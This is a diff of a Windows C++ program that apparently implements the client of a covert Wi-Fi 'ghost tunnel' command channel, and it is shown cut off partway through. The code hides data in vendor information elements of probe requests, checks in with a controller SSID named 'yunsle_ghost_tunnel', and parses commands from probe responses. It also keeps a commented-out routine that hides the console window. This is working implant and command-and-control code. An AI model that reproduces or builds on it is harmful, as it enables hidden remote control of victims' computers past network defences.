@@ -14,7 +14,7 @@
 #pragma comment(lib, "wlanapi.lib")
 #pragma comment(lib, "ole32.lib")
 
-//payload数据结构
+//payload结构体
 struct ie_data
 {
 	unsigned char id;
@@ -23,79 +23,84 @@ struct ie_data
 };
 
 
+
 int wmain()
 {
+	/* 开始隐藏窗口 */
 	/*
 	HWND hwnd;
-	hwnd = FindWindow(L"ConsoleWindowClass", NULL); //处理顶级窗口的类名和窗口名称匹配指定的字符串,不搜索子窗口。  
+	hwnd = FindWindow(L"ConsoleWindowClass", NULL);
 	if (hwnd)
 	{
-		ShowWindow(hwnd, SW_HIDE);               //设置指定窗口的显示状态  
+	ShowWindow(hwnd, SW_HIDE);
 	}
 	*/
+	/* 结束隐藏窗口 */
 
-	// Declare and initialize variables.
+	// 初始化变量
 
 	HANDLE hClient = NULL;
-	DWORD dwMaxClient = 2;   //    
+	DWORD dwMaxClient = 2;
 	DWORD dwCurVersion = 0;
 	DWORD dwResult = 0;
-	int iRet = 0;
+
 
 	WCHAR GuidString[40] = { 0 };
 
-	int i;
 
-	/* variables used for WlanEnumInterfaces  */
 
-	PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
-	PWLAN_INTERFACE_INFO pIfInfo = NULL;
 
-	//AVAILABLE属性
-	PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL;
-	PWLAN_AVAILABLE_NETWORK pBssEntry = NULL;
+	PWLAN_INTERFACE_INFO_LIST pIfList = NULL;		//网卡列表
+	PWLAN_INTERFACE_INFO pIfInfo = NULL;			//网卡信息
 
-	//添加的Bss属性
-	//PWLAN_BSS_ENTRY bss_entry = NULL;
+	PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL;	//附近网络信息列表
+	PWLAN_AVAILABLE_NETWORK pBssEntry = NULL;		//AP实体
 
-	int iRSSI = 0;
 
-	//封装payload
+													//int iRSSI = 0;
+
+													/*
+													开始封装payload
+													*/
 	struct ie_data      *piedata = NULL;
 	int         response_len = 0;
 	char            *response = NULL;
-	//yunsle定义len和buf
-	int len = 18;
-	char *buf = "command ok!!!!!!.";
 
+	int len = 18;					 //len为数据长度
+	char *buf = "command ok!!!!!!."; //buf为要发送的数据（最大长度240），
+
+									 //结构体初始化
 	response_len = sizeof(WLAN_RAW_DATA) - 1 + sizeof(struct ie_data) - 1 + len;
 	response = (char *)malloc(response_len);
 	memset(response, '\0', response_len);
-	//yunsle定义pwlan_data的类型为PWLAN_RAW_DATA
+
+	//转化为PWLAN_RAW_DATA数据类型
 	PWLAN_RAW_DATA pwlan_data = (PWLAN_RAW_DATA)response;
 	pwlan_data->dwDataSize = sizeof(struct ie_data) - 1 + len;
 
+	//写入payload
 	piedata = (struct ie_data *)&pwlan_data->DataBlob[0];
 	piedata->id = (char)221;
 	piedata->len = len;
-	//buf为要发送的数据（最大长度240），len为数据长度
+
 	memcpy(&piedata->val[0], buf, len);
+	/*
+	结束封装payload
+	*/
 
 
 
 
+	/*
+	开始查询网卡状态
+	*/
 
-
-
-
-	//循环接收命令
 	while (true) {
 
 		//打开wlan句柄
 		dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
 		if (dwResult != ERROR_SUCCESS) {
 			wprintf(L"WlanOpenHandle failed with error: %u\n", dwResult);
-			// FormatMessage can be used to find out why the function failed
 			return 1;
 		}
 
@@ -104,18 +109,16 @@ int wmain()
 		dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
 		if (dwResult != ERROR_SUCCESS) {
 			wprintf(L"WlanEnumInterfaces failed with error: %u\n", dwResult);
-			// FormatMessage can be used to find out why the function failed
 			return 1;
 		}
 		else {
+			//打印wlan设备信息
 			wprintf(L"Num Entries: %lu\n", pIfList->dwNumberOfItems);
 			wprintf(L"Current Index: %lu\n", pIfList->dwIndex);
-			for (i = 0; i < (int)pIfList->dwNumberOfItems; i++) {
+			for (int i = 0; i < (int)pIfList->dwNumberOfItems; i++) {
 				pIfInfo = (WLAN_INTERFACE_INFO *)&pIfList->InterfaceInfo[i];
 				wprintf(L"  Interface Index[%d]:\t %lu\n", i, i);
-				iRet = StringFromGUID2(pIfInfo->InterfaceGuid, (LPOLESTR)&GuidString, 39);
-				// For c rather than C++ source code, the above line needs to be
-				// iRet = StringFromGUID2(&pIfInfo->InterfaceGuid, (LPOLESTR) &GuidString, 39); 
+				int iRet = StringFromGUID2(pIfInfo->InterfaceGuid, (LPOLESTR)&GuidString, 39);
 				if (iRet == 0)
 					wprintf(L"StringFromGUID2 failed\n");
 				else {
@@ -158,29 +161,40 @@ int wmain()
 			}
 		}
 
+		/*
+		结束查询网卡状态
+		*/
 
-		//发送payload——————start
 
-		/*DWORD WINAPI WlanScan(
+
+
+		/*
+		DWORD WINAPI WlanScan(
 		_In_             HANDLE         hClientHandle,
 		_In_       const GUID           *pInterfaceGuid,
 		_In_opt_   const PDOT11_SSID    pDot11Ssid,
 		_In_opt_   const  PWLAN_RAW_DATA  pIeData,
 		_Reserved_       PVOID          pReserved
-		);*/
-		/*
+		);
+
 		typedef struct _DOT11_SSID {
 		ULONG uSSIDLength;
 		UCHAR ucSSID[DOT11_SSID_MAX_LENGTH];
 		} DOT11_SSID, *PDOT11_SSID;
+
+		开始设置目标ssid信息
+
 		*/
+
 		PDOT11_SSID pdo = new DOT11_SSID;
-		pdo->uSSIDLength = 19;
+		pdo->uSSIDLength = 19; //这一部分设置为动态获取
 		UCHAR *ucp = NULL;
 		ucp = (UCHAR *)&pdo->ucSSID;
 		ucp = (UCHAR *)malloc(pdo->uSSIDLength);
 		memset(ucp, '\0', pdo->uSSIDLength);
-		strcpy_s((char*)ucp, sizeof("yunsle_ghost_tunnel"),"yunsle_ghost_tunnel");
+		strcpy_s((char*)ucp, sizeof("yunsle_ghost_tunnel"), "yunsle_ghost_tunnel");
+
+
 		dwResult = WlanScan(hClient, &pIfInfo->InterfaceGuid, NULL, pwlan_data, NULL);
 		if (dwResult != ERROR_SUCCESS) {
 			wprintf(L"WlanScan failed with error: %u\n", dwResult);
@@ -189,10 +203,17 @@ int wmain()
 		else {
 			printf("已发送上线请求!!\n");
 		}
-		//发送payload——————end
+		//释放空间
 		free(pdo);
+		/*
+		结束设置目标ssid信息
+		*/
 
-		//获取可用AP
+
+		/*
+		开始发送probe request
+		*/
+		//获取可用AP 这里需要修改
 		dwResult = WlanGetAvailableNetworkList(hClient,
 			&pIfInfo->InterfaceGuid,
 			0,
@@ -219,12 +240,15 @@ int wmain()
 				//获得BSS的LIST
 				//为了接收Probe Response帧，并解析出指令代码
 				PWLAN_BSS_LIST ppWlanBssList;
+
+				/*这一部分以下代码保留*/
 				DWORD dwResult2 = WlanGetNetworkBssList(hClient, &pIfInfo->InterfaceGuid,
 					&pBssEntry->dot11Ssid,
 					pBssEntry->dot11BssType,
 					pBssEntry->bSecurityEnabled,
 					NULL,
 					&ppWlanBssList);
+
 				//错误处理
 				if (dwResult2 != ERROR_SUCCESS) {
 					wprintf(L"WlanGetNetworkBssList failed with error: %u\n",
@@ -239,7 +263,7 @@ int wmain()
 					for (int z = 0; z < ppWlanBssList->dwNumberOfItems; z++)
 					{
 						WLAN_BSS_ENTRY *bss_entry = &ppWlanBssList->wlanBssEntries[z];
-						//添加判断是否是yunsle
+						//添加判断是否是为目标SSID
 						if (_stricmp((char *)bss_entry->dot11Ssid.ucSSID, "yunsle_ghost_tunnel") == 0) {
 							printf("找到控制端!\n");
 							char *pp = (char *)((unsigned long)bss_entry + bss_entry->ulIeOffset);
